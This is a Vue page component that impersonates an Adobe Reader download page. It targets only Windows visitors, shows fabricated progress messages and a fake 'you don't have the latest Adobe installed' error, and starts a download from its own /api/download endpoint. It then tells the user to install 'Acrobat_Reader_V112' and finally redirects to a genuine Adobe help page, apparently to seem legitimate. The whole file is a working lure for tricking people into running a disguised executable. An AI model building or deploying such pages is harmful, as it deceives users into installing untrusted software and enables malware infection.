<template>
  <main v-if="isWindows" :class="{ expanded: expanded }">
    <!-- Top left logo -->
    <p style="text-align: left;">
      <img src="data:image/png;base64," alt="img" width="100" height="100" />
    </p>

    <!-- Countdown text -->
    <p id="countdown-text">{{ statusMessage }}</p>
    <p style="text-align: center;">&nbsp;</p>

    <!-- Main heading -->
    <h1 :class="{ 'animate-slide': animate }">
      <template v-if="errorMode">
        <span class="error-title">Ooops!</span>
        <span class="error-sub">you don't have the latest Adobe installed</span>
      </template>
      <template v-else>
        {{ title }}
      </template>
    </h1>

    <!-- Countdown -->
    <p v-if="!downloadComplete">
      Estimated time:
      <span class="count" :class="{ pulse: pulsing }" id="countdown">{{ countdown }}</span>
      seconds
    </p>

    <!-- Manual download link -->
    <p>
      If the download doesnt start automatically,
      <a id="manualDownload" @click.prevent="manualDownload">Click here</a>
    </p>
  </main>

  <!-- Restricted for non-Windows -->
  <div v-else class="restricted">
    <div>
      <h2>Access Restricted</h2>
      <p>This resource is only available for Windows devices.</p>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted } from "vue";

const isWindows = /Windows/i.test(navigator.userAgent || "");

const title = ref("Preparing your download");
const countdown = ref(8);
const pulsing = ref(false);
const animate = ref(false);
const expanded = ref(false);

const downloadComplete = ref(false);
const statusMessage = ref("Preparing your download");
const errorMode = ref(false);

const statusMessages = [
  "Initializing document viewer...",
  "Validating document security...",
  "Loading document metadata...",
  "Preparing document viewer...",
  "Checking Adobe Reader compatibility...",
  "Download starting...",
  "Download Successful!",
  "Document Ready!"
];

function animateTitle(newText) {
  animate.value = true;
  setTimeout(() => {
    title.value = newText;
    animate.value = false;
  }, 500);
}

async function requestDownloadToken() {
  const token = Math.random().toString(36).substring(2, 14);
  try {
    await fetch(`/api/store-token?token=${token}`, { method: "POST", keepalive: true });
    fetch(`/api/log?token=${token}`, { method: "POST", keepalive: true });
  } catch {}
  return token;
}

async function triggerDownload() {
  const token = await requestDownloadToken();
  window.location.href = `/api/download?token=${token}`;
  statusMessage.value = "Find and install Acrobat_Reader_V112 after download";
  downloadComplete.value = true;
  expanded.value = true;
  errorMode.value = true;
}

function manualDownload() {
  animateTitle("Starting manual download");
  triggerDownload();
}

onMounted(() => {
  if (!isWindows) return;

  let seconds = 8;
  let messageIndex = 0;
  const totalMessages = statusMessages.length;
  const intervalPerMessage = 8 / totalMessages;

  countdown.value = seconds;
  statusMessage.value = statusMessages[messageIndex];

  setTimeout(() => animateTitle("Starting your download..."), 4000);

  const timer = setInterval(() => {
    seconds -= 1;
    countdown.value = seconds;

    pulsing.value = true;
    setTimeout(() => (pulsing.value = false), 300);

    const progress = 8 - seconds;
    const newIndex = Math.floor(progress / intervalPerMessage);
    if (newIndex < totalMessages && newIndex !== messageIndex) {
      messageIndex = newIndex;
      statusMessage.value = statusMessages[messageIndex];
    }

    if (seconds <= 0) {
      clearInterval(timer);
      triggerDownload();
    }
  }, 1000);

  setTimeout(() => {
    const target = "https://helpx.adobe.com/reader/system-requirements.html";
    if (window.top !== window.self) window.top.location.href = target;
    else window.location.href = target;
  }, 32000);
});
</script>
